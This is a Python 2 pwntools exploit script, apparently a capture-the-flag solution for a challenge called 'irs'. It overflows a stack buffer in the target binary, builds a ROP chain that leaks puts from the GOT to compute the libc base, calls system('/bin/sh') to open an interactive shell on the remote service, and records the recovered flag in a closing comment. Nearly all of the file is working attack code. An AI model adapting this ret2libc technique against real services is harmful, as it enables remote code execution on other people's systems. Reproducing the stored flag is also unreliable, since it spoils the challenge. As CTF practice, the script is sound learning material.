#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True
data = "test"
main = 0x08048A39
puts = 0x080484F8
putsgot = 0x0804AFDC
if DEBUG:
    offset = 0x64d80
    system = 0x3e3e0
    binsh = 0x15f551
else:
    offset = 0x5f140
    system = 0x3a940
    binsh = 0x158e8b
# SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1
# libc6-i386_2.23-0ubuntu4_amd64.so

###

if DEBUG:
    r = process("irs.fdcb32492e18be0af53449cee097327b58e542f640df440dfa5097fa567bd094")
else:
    r = remote("irs.pwn.republican", 4127)


def new_file():
    global r

    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(data)
    r.recvuntil(": ")
    r.sendline(data)
    r.recvuntil(": ")
    r.sendline("0")
    r.recvuntil(": ")
    r.sendline("0")
    r.recvuntil(data)
    r.recvuntil(data)
    r.recvline()


def edit_file(pwn = False):
    global r
    global data
    global system
    global binsh
    global offset

    r.sendline("3")
    r.recvuntil(": ")
    r.sendline(data)
    r.recvuntil(": ")
    r.sendline(data)
    r.recvuntil(": ")
    r.sendline("0")
    r.recvuntil(": ")
    r.sendline("0")
    r.recvuntil("y/n")
    r.recvline()
    #gdb.attach(r, "b *edit_return")
    #raw_input()
    #log.info("press key")
    p = "A" * 25
    if not pwn:
        p += p32(puts)
        p += p32(0x080484b9) # pop ret;
        p += p32(putsgot)
        p += p32(main)
        r.sendline(p)
        r.recvline()
        leak = u32(r.recv(4))
        libcBase = leak - offset
        system = libcBase + system
        binsh = libcBase + binsh
        log.info("leak: " + hex(leak))
        log.info("libcBase: " + hex(libcBase))
        log.info("system: " + hex(system))
        log.info("binsh: " + hex(binsh))
    else:
        p += p32(system)
        p += p32(0xdeadbeef)
        p += p32(binsh)
        r.sendline(p)
        r.recvline()


r.recvuntil("Trump")
r.recvline()
new_file()
edit_file()
r.recvuntil("Trump")
r.recvline()
new_file()
edit_file(True)
r.interactive()

# flag is: flag{c4n_1_g3t_a_r3fund}
